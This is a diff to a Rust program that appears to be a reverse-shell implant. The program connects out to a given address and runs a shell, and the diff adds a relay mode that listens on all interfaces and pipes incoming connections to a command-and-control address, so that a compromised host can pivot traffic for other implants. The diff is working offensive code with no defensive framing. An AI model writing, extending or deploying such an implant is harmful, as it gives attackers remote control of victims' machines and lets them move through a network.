@@ -1,13 +1,13 @@
 use std::env;
 use std::io::{self, Read, Write};
-use std::net::TcpStream;
+use std::net::{TcpListener, TcpStream};
 use std::process::{Command, Stdio};
 use std::thread;
 use std::time::Duration;
 
 const BUF_SIZE: usize = 4096;
 
-//TODO: this could failed because tje commmand is not being handle the exceptions 
+//TODO: this could failed because tje commmand is not being handle the exceptions
 fn hostname() -> String {
     if cfg!(windows) {
         env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".into())
@@ -95,14 +95,88 @@ fn run_shell(mut stream: TcpStream) {
     }
 }
 
+fn pipe(mut a: TcpStream, mut b: TcpStream) {
+    let mut a2 = match a.try_clone() {
+        Ok(s) => s,
+        Err(_) => return,
+    };
+    let mut b2 = match b.try_clone() {
+        Ok(s) => s,
+        Err(_) => return,
+    };
+
+    let t = thread::spawn(move || {
+        let mut buf = [0u8; BUF_SIZE];
+        loop {
+            match a.read(&mut buf) {
+                Ok(0) | Err(_) => break,
+                Ok(n) => {
+                    if b.write_all(&buf[..n]).is_err() {
+                        break;
+                    }
+                }
+            }
+        }
+        let _ = b.shutdown(std::net::Shutdown::Write);
+    });
+
+    let mut buf = [0u8; BUF_SIZE];
+    loop {
+        match b2.read(&mut buf) {
+            Ok(0) | Err(_) => break,
+            Ok(n) => {
+                if a2.write_all(&buf[..n]).is_err() {
+                    break;
+                }
+            }
+        }
+    }
+    let _ = a2.shutdown(std::net::Shutdown::Write);
+    let _ = t.join();
+}
+
+fn relay_mode(c2_addr: String, relay_port: u16) {
+    let listener = match TcpListener::bind(format!("0.0.0.0:{relay_port}")) {
+        Ok(l) => l,
+        Err(e) => {
+            eprintln!("relay bind failed: {e}");
+            return;
+        }
+    };
+    eprintln!("relay :{relay_port} -> {c2_addr}");
+
+    for incoming in listener.incoming() {
+        if let Ok(client) = incoming {
+            let c2 = c2_addr.clone();
+            thread::spawn(move || {
+                if let Ok(server) = TcpStream::connect(&c2) {
+                    pipe(client, server);
+                }
+            });
+        }
+    }
+}
+
 fn main() {
     let args: Vec<String> = env::args().collect();
-    if args.len() != 3 {
-        eprintln!("usage: {} <ip> <port>", args[0]);
+    if args.len() < 3 || args.len() > 4 {
+        eprintln!("usage: {} <ip> <port> [relay_port]", args[0]);
         std::process::exit(1);
     }
 
     let addr = format!("{}:{}", args[1], args[2]);
+
+    if args.len() == 4 {
+        let relay_port: u16 = match args[3].parse() {
+            Ok(p) => p,
+            Err(_) => {
+                eprintln!("invalid relay port");
+                std::process::exit(1);
+            }
+        };
+        let relay_addr = addr.clone();
+        thread::spawn(move || relay_mode(relay_addr, relay_port));
+    }
 
     loop {
         match TcpStream::connect(&addr) {
